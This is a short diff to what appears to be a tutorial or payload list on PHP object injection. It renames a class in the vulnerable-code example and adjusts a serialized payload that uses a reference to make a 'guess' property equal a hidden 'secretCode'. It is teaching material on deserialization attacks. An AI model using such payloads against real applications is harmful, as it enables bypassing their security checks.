@@ -88,7 +88,7 @@ Vulnerable code:
 
 ```php
 <?php
-class Object
+class ObjectExample
 {
   var $guess;
   var $secretCode;
@@ -108,7 +108,7 @@ if($obj) {
 Payload:
 
 ```php
-O:6:"Object":2:{s:10:"secretCode";N;s:4:"guess";R:2;}
+O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
 ```
 
 We can do an array like this:
